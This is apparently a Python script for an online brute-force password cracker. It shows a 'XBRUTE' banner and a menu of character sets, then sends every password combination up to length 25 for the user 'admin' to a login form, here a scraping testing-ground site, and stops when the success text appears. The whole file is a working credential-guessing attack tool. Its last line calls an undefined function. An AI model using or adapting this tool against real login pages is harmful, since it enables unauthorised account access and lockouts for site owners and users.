from string import ascii_lowercase
from string import ascii_uppercase
from itertools import product
import string
import time
import threading
from colorama import Fore
import requests
import os

def menu():
    clear = lambda: os.system('cls')

    clear()
    print(f"""{Fore.RED}
▒██   ██▒ ▄▄▄▄    ██▀███   █    ██ ▄▄▄█████▓▓█████
▒▒ █ █ ▒░▓█████▄ ▓██ ▒ ██▒ ██  ▓██▒▓  ██▒ ▓▒▓█   ▀
░░  █   ░▒██▒ ▄██▓██ ░▄█ ▒▓██  ▒██░▒ ▓██░ ▒░▒███
 ░ █ █ ▒ ▒██░█▀  ▒██▀▀█▄  ▓▓█  ░██░░ ▓██▓ ░ ▒▓█  ▄
▒██▒ ▒██▒░▓█  ▀█▓░██▓ ▒██▒▒▒█████▓   ▒██▒ ░ ░▒████▒
▒▒ ░ ░▓ ░░▒▓███▀▒░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒   ▒ ░░   ░░ ▒░ ░
░░   ░▒ ░▒░▒   ░   ░▒ ░ ▒░░░▒░ ░ ░     ░     ░ ░  ░
 ░    ░   ░    ░   ░░   ░  ░░░ ░ ░   ░         ░
 ░    ░   ░    ░     ░        ░                 ░  ░
               ░

{Fore.WHITE}
[1] : Just Lowercase
[2] : Lowercase And Uppercase
[3] : Lowercase, Uppercase, And Numbers
[4] : Just Numbers
""")

    sel = input("> ")
    if sel=="1":
        clear()
        chars = string.ascii_lowercase

    elif sel=="2":
        clear()
        chars = string.ascii_lowercase + string.ascii_uppercase

    elif sel=="3":
        clear()
        chars = string.ascii_lowercase + string.ascii_uppercase + string.digits

    elif sel=="4":
        clear()
        chars = string.digits


    num = 25
    url = 'http://testing-ground.scraping.pro/login?mode=login'
    username = ("admin")
    html = ('<h3 class="success">WELCOME :)</h3>')

    start = time.perf_counter()
    for i in range(num+1):
        for attempt in product(chars, repeat=i):
            pure = ''.join([str(elem) for elem in attempt])

            payload = {
                'usr': username,
                'pwd': pure
            }

            re = requests.post(url=url, data=payload)
            print(f"{Fore.WHITE}[+] Fail : {Fore.RED}{username}:{pure}")

            if html in re.text:
                print(f"{Fore.WHITE}[!] Hit : {Fore.GREEN}{pure}")
                stop = time.perf_counter()
                timer = (stop - start)
                passwd = ''.join(attempt)
                print("")
                print(f"{Fore.WHITE}Password cracked in {timer} seconds\nPassword : {passwd}")
                input()
                exit()


menu()
brute(password, num)
